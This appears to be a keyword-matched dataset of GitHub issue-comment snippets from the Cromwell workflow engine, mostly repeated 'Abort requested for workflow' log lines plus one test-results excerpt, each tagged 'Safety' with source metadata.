Safety,"24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3107,Abort,Abort,3107,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3259,Abort,Abort,3259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"3 minutes, 4 seconds); - should successfully run inline_file_custom_entryname *** FAILED *** (3 minutes, 9 seconds); - should successfully run iwdr_input_string *** FAILED *** (3 minutes, 10 seconds); - should successfully run iwdr_input_string_function *** FAILED *** (2 minutes, 59 seconds); - should successfully run non_root_default_user *** FAILED *** (3 minutes, 20 seconds); - should successfully run relative_output_paths *** FAILED *** (2 minutes, 42 seconds); - should successfully run space *** FAILED *** (4 minutes, 18 seconds); - should successfully run standard_output_paths_colliding_prevented *** FAILED *** (3 minutes, 1 second); - should successfully run three_step_cwl *** FAILED *** (5 minutes, 29 seconds); - should NOT call cache the second run of readFromCacheFalse (3 minutes, 21 seconds); - should abort a workflow immediately after submission abort.instant_abort (5 seconds, 52 milliseconds); - should abort a workflow mid run abort.scheduled_abort (2 minutes, 20 seconds); - should abort a workflow mid run abort.sub_workflow_abort (3 minutes, 2 seconds); - should call cache the second run of cacheBetweenWF (2 minutes, 55 seconds); - should call cache the second run of call_cache_hit_prefixes_no_hint (1 minute, 40 seconds); - should call cache the second run of floating_tags (3 minutes, 25 seconds); - should fail during execution bad_docker_name (35 seconds, 238 milliseconds); - should fail during execution bad_workflow_failure_mode (5 seconds, 920 milliseconds); - should fail during execution chainfail (42 seconds, 454 milliseconds); - should fail during execution cont_while_possible (3 minutes, 57 seconds); - should fail during execution cont_while_possible_scatter (2 minutes, 27 seconds); - should fail during execution draft3_read_file_limits (3 minutes, 26 seconds); - should fail during execution empty_filename (16 seconds, 333 milliseconds); - should fail during execution failing_continue_on_return_code (55 seconds, 180 milliseconds); - should fail d",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:2711,abort,abort,2711,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"30,919 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1134,Abort,Abort,1134,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"35,939 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1286,Abort,Abort,1286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"3:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1893,Abort,Abort,1893,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"40,959 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:45,978 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:23:50,999 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:23:56,019 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:1438,Abort,Abort,1438,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:01,039 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2045,Abort,Abort,2045,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:06,058 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:11,079 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:16,108 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:21,129 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-ak",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2197,Abort,Abort,2197,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:26,149 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:31,169 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:36,189 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:41,209 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:2804,Abort,Abort,2804,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:46,229 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:24:51,249 cromwell-system-akka.dispatchers.engine-dispatcher-28 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:24:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-a",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3411,Abort,Abort,3411,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
Safety,"4:56,269 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:01,289 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:06,319 cromwell-system-akka.dispatchers.engine-dispatcher-23 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:11,338 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:16,358 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:21,379 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:26,399 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:31,419 cromwell-system-akka.dispatchers.engine-dispatcher-27 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:36,439 cromwell-system-akka.dispatchers.engine-dispatcher-10 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:41,459 cromwell-system-akka.dispatchers.engine-dispatcher-7 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:46,479 cromwell-system-akka.dispatchers.engine-dispatcher-25 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:25:51,499 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. …2020-10-22 15:25:56,518 cromwell-system-akka.dispatchers.engine-dispatcher-21 INFO - Abort requested for workflow 2ed13073-9af5-40a8-8e97-cec76e7820d0. 2020-10-22 15:26:01,538 cromwell-system-",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929:3715,Abort,Abort,3715,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714650929,1,['Abort'],['Abort']
